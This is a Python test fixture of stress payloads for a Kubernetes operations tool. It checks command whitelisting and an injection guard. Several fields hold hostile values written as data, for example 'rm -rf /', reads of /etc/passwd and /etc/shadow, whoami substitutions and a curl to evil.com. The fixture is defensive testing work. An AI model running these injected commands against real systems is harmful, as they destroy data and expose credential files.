"""Stress payloads for kubernetes_ops (#206).

Goals (see issue #206):
- Pydantic validation on `command` + whitelist of 13 commands.
- Command injection protection in clients/kubernetes.py (DANGEROUS_CHARS
  on namespace / kubeconfig / context / name / resource_type).
- Plausible requests without KUBECONFIG → TOOL-ERR, not CRASH-500.
"""
TOOL_NAME = "kubernetes_ops"

_long_str = "a" * 10_000

PAYLOADS = [
    # --- Validation ---
    {"description": "No command", "arguments": {}},
    {"description": "Empty command", "arguments": {"command": ""}},
    {"description": "Non-whitelisted command", "arguments": {"command": "delete_namespace"}},
    {"description": "describe_resource without resource_type", "arguments": {
        "command": "describe_resource", "name": "my-pod"}},
    {"description": "resource_type outside whitelist", "arguments": {
        "command": "describe_resource", "resource_type": "clusterrolebinding", "name": "x"}},
    {"description": "get_pod without name", "arguments": {
        "command": "get_pod", "namespace": "default"}},

    # --- Command injection (kubernetes.py DANGEROUS_CHARS guard) ---
    {"description": "Semicolon in namespace", "arguments": {
        "command": "list_pods", "namespace": "default; rm -rf /"}},
    {"description": "Pipe in name", "arguments": {
        "command": "get_pod", "namespace": "default", "name": "pod|cat /etc/passwd"}},
    {"description": "Backticks in resource_type", "arguments": {
        "command": "describe_resource", "resource_type": "pod`whoami`", "name": "x"}},
    {"description": "Newline in namespace", "arguments": {
        "command": "list_pods", "namespace": "default\nkube-system"}},
    {"description": "$() in name", "arguments": {
        "command": "get_pod", "namespace": "default", "name": "$(whoami)"}},
    {"description": "&& in kubeconfig", "arguments": {
        "command": "list_pods", "kubeconfig": "/path && curl evil.com"}},
    {"description": "Null byte in context", "arguments": {
        "command": "list_pods", "context": "prod\x00kube-system"}},

    # --- Path traversal in kubeconfig ---
    {"description": "Path traversal in kubeconfig", "arguments": {
        "command": "list_pods", "kubeconfig": "../../etc/shadow"}},

    # --- Boundaries ---
    {"description": "Extremely long namespace", "arguments": {
        "command": "list_pods", "namespace": _long_str}},
    {"description": "Invalid namespace chars (uppercase)", "arguments": {
        "command": "list_pods", "namespace": "DEFAULT"}},
    {"description": "Label selector very long", "arguments": {
        "command": "list_pods", "namespace": "default",
        "label_selector": ",".join(f"app=v{i}" for i in range(1000))}},

    # --- Plausible (no kubeconfig → TOOL-ERR) ---
    {"description": "list_pods plausible", "arguments": {
        "command": "list_pods", "namespace": "default"}},
    {"description": "get_events plausible", "arguments": {
        "command": "get_events", "namespace": "default"}},
    {"description": "list_deployments plausible", "arguments": {
        "command": "list_deployments", "namespace": "kube-system"}},
]
